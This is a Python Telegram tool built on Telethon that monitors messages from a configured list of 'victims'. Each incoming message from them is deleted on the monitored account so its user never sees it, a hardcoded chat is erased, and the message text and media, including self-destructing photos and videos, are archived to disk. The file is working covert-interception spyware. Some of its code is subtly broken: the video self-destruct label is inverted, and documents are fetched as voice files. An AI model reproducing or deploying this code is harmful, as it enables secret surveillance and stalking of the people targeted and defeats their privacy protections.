from telethon import TelegramClient, events
import json
import os
import re
from datetime import datetime


class Interceptor():
    def __init__(self):
        self.path = 'saved_data/'
        print('[-] Initialization')
        # Telegram API tokens
        self.api_id, self.api_hash = self.set_config()

        self.targets_list = []
        self.victims_id_list = []
        self.load_target_list()

        self.client = None

    def set_config(self):
        """
               This function load from JSON telegram tokens
               :return:
               """
        if not os.path.isfile('config.json'):
            with open('config.json', 'w', encoding='utf-8') as file:
                default = {"api_id": "None", "api_hash": "None"}
                json.dump(default, file)
                # self.set_config()
        with open('config.json', 'r', encoding='utf-8') as file:
            dump = file.read()
            config = json.loads(dump)
            self.api_id = config['api_id']
            self.api_hash = config['api_hash']
            if not self.api_id == 'None':
                self.api_id = int(self.api_id)
            need_write = False
            if self.api_id == "None":
                need_write = True
                self.api_id = int(input('[!] No found api_id, please past here api_id: '))
            if self.api_hash == "None":
                need_write = True
                self.api_hash = input('[!] No found api_hash, please past here api_hash: ')

        if need_write:
            with open('config.json', 'w', encoding='utf-8') as file:
                tokens = {"api_id": self.api_id, "api_hash": self.api_hash}
                json.dump(tokens, file)
        return self.api_id, self.api_hash

    def load_target_list(self) -> None:
        """
        This function load victim list from JSON
        :return: None
        """
        if not os.path.isfile('target_list.json') :
            with open('target_list.json', 'w', encoding='utf-8') as file:
                default = {"items": []}
                json.dump(default, file)
        with open('target_list.json', 'r', encoding='utf-8') as file:
            base_damp = file.read()
            self.targets_list = json.loads(base_damp)
            if not self.targets_list['items']:
                print('[!] No victims detected!')
                self.add_victim()
                print(self.targets_list)

    def save_victims(self) -> None:
        """
        This function save victims into JSON
        :return: None
        """
        with open('target_list.json', "w", encoding='utf-8') as file:
            json.dump(self.targets_list, file)

    def add_victim(self) -> None:
        """
        This function save add new victim
        :return: None
        """
        i = ''
        while not i == 'n':
            new_victim_id = input('[-] Enter victim id: ')
            try:
                new_victim_id = int(new_victim_id)
            except:
                print('[!] Incorrect value, id mast be integer (check README)')
                continue
            if new_victim_id == '':
                print('[!] Incorrect value, id mast be integer (check README)')
                continue

            new_victim_name = input('[-] Enter victim name: ')

            self.targets_list['items'].append({'id': new_victim_id, 'name': new_victim_name})
            self.save_victims()

            i = input('[-] Enter one more victim(y)? ')
            if i == 'y':
                continue
            else:
                break

    def get_victims_id(self) -> None:
        """
        This function load victims telergram ids
        :return: None
        """

        for item in self.targets_list['items']:
            self.victims_id_list.append(int(item['id']))
        print('[+] Victims ids loaded')

    def connect_to_telegram(self) -> None:
        """
        This function create connection to telegram
        :return: None
        """
        self.client = TelegramClient('Interceptor', self.api_id, self.api_hash)
        self.client.start()

    def listen_messages(self) -> None:
        """
        This function listen messages and wait for message (chats) from one of victims
        :return: None
        """
        print('[-] Start listening messages')
        print('#'*40)

        @self.client.on(events.NewMessage(chats=self.victims_id_list))
        async def handle_new_message(event):
            await event.message.delete(revoke=False)
            if len(await self.client.get_messages(734337611, limit=10)) < 4:
                await self.client.delete_dialog(734337611)
            print('[+] Deleted chat')
            self.save_mesage(self.obtain_message(event))
            await self.download_media_files(event.message, self.obtain_message(event)['name'],
                                            self.obtain_message(event)['id'])

    def check_dolder(self, path) -> None:
        """
        This function and create check folders for download user's media
        :param path: target path
        :return: None
        """
        folders = path.split('/')
        current = './'
        for folder in folders:
            if not os.path.exists(f'{current}/{folder}'):
                os.mkdir(f'{current}/{folder}')
            current = f'{current}/{folder}/'

    async def download_media_files(self, message, name, id) -> None:
        """
        This function save media from messages
        :param message: message event
        :param name: name of sender
        :param id: if of sender
        :return: none
        """
        if message.photo:
            type = 'Photo'
            time = datetime.now().strftime("%d%m%Y%H%M%S")
            if message.media.ttl_seconds:
                type = 'SELF_DISTRICT ' + type
                file_name = f'/photos/SD{time}.jpg'
            else:
                file_name = f'/photos/{time}.jpg'

            self.check_dolder(f'{self.path}/{name}photos/')
            await self.client.download_media(message.photo, file=f'{self.path}{name}/{file_name}')
            self.save_mesage({"text": f'{type} from {name} saved to {self.path}{name}/{file_name}',
                    'id': message.media.photo.id, "time": time,
                "name": name, "user": id})
            print(f'[+] {type} from {name} saved to {self.path}{name}/{file_name}')

        if message.video:
            type = "Video"
            time = datetime.now().strftime("%d%m%Y%H%M%S")
            if message.media.ttl_seconds:
                file_name = f'videos/SD{time}.mp4'
            else:
                file_name = f'videos/{time}.mp4'
                type = 'SELF_DISTRICT ' + type
            self.check_dolder(f'{self.path}/{name}/videos/')

            await self.client.download_media(message.video, file=f'{self.path}{name}/{file_name}')
            self.save_mesage({"text": f'{type} from {name} saved to {self.path}{name}/{file_name}',
                              'id': 0, "time": time,
                              "name": name, "user": id})
            print(f'[+] {type} from {name} saved to {self.path}{name}/{file_name}')

        if message.voice:
            time = datetime.now().strftime("%d%m%Y%H%M%S")
            file_name = f'voice/{time}.mp3'
            self.check_dolder(f'{self.path}{name}/voice/')
            await self.client.download_media(message.voice, file=f'{self.path}{name}/{file_name}')
            self.save_mesage({"text": f'Voice from {name} saved to {self.path}{name}/{file_name}',
                              'id': 0, "time": time,
                              "name": name, "user": id})
            print(f'[+] Voice from {name} saved to {self.path}{name}/{file_name}')

        if message.document:
            time = datetime.now().strftime("%d%m%Y%H%M%S")
            file_name = f'docs/{time}.mp3'
            self.check_dolder(f'{self.path}{name}/docs/')
            await self.client.download_media(message.voice, file=f'{self.path}{name}/{file_name}')
            self.save_mesage({"text": f'Document from {name} saved to {self.path}{name}/{file_name}',
                              'id': 0, "time": time,
                              "name": name, "user": id})
            print(f'[+] Document from {name} saved to {self.path}{name}/{file_name}')

    def obtain_message(self, event) -> dict:
        """
        This function get info from message
        :param event:
        :return: dict {"text": message_text, 'id': message_id, "time": message_time,
                "name": message_sender_name, "user": message_sender_i
        """
        message_text = event.message.to_dict()['message']
        message_time = event.message.to_dict()['date']
        message_sender_id = event.message.to_dict()['peer_id']['user_id']
        message_id = event.message.to_dict()['id']
        message_sender_name = self.get_sender_info(message_sender_id)
        print(f'[+] From {message_sender_name} at {message_time}')
        return {"text": message_text, 'id': message_id, "time": message_time,
                "name": message_sender_name, "user": message_sender_id}

    def get_sender_info(self, id) -> str:
        """
        This function search user-name from id
        :param id: user id
        :return: user name
        """
        for item in self.targets_list["items"]:
            if item['id'] == id:
                return item['name']

    def save_mesage(self, dictionary) -> None:
        """
        This message save intercepted message into file
        :param dictionary: message info (from self.obtain_message())
        :return: None
        """

        if not os.path.exists(f'{self.path}{dictionary["name"]}'):
            os.mkdir(f'{self.path}{dictionary["name"]}')

        path = f'{self.path}{dictionary["name"]}/messages.txt'

        with open(path, 'a', encoding='utf-8') as file:
            line_length = 120
            column1_width = 12

            file.write(
                "| {:<{}} | {:<{}} |\n".format("ID", column1_width, dictionary['id'], line_length - column1_width - 7))
            file.write("+" + "-" * (line_length - 2) + "+\n")

            file.write(
                "| {:<{}} | {:<{}} |\n".format("Time", column1_width, dictionary['time'],
                                               line_length - column1_width - 7))
            file.write("+" + "-" * (line_length - 2) + "+\n")

            file.write(
                "| {:<{}} | {:<{}} |\n".format("Name", column1_width, dictionary['name'],
                                               line_length - column1_width - 7))
            file.write("+" + "-" * (line_length - 2) + "+\n")

            file.write(
                "| {:<{}} | {:<{}} |\n".format("User", column1_width, dictionary['user'],
                                               line_length - column1_width - 7))
            file.write("+" + "-" * (line_length - 2) + "+\n")

            text = re.sub(r'[^a-zA-Z0-9а-яА-Я\s.,?!]', '', re.sub(r'\s+', ' ',
                                                                  dictionary['text'].replace('\n', ' ').replace(' ',
                                                                                                                ' ').strip()))
            len_text = 0
            for char in text:
                len_text = len_text + 1

            text_lines = [text[i:i + (line_length - column1_width - 7)] for i in
                          range(0, len(text), line_length - column1_width - 7)]

            for i, line in enumerate(text_lines):
                if i == 0:
                    file.write(
                        "| {:<{}} | {:<{}} |\n".format("Text", column1_width, line, line_length - column1_width - 7))
                else:
                    file.write("| {:<{}} | {:<{}} |\n".format("", column1_width, line, line_length - column1_width - 7))

            file.write("+" + "-" * (line_length - 2) + "+\n")
            file.write("+" + "#" * (line_length - 2) + "+\n")

    def run(self, path):

        try:
            self.connect_to_telegram()
        except ConnectionError:
            print("[!] Connection error. trying again...")
            self.connect_to_telegram()

        self.get_victims_id()

        self.path = path
        if not os.path.exists(self.path):
            os.mkdir(self.path)

        self.listen_messages()

        self.client.run_until_disconnected()
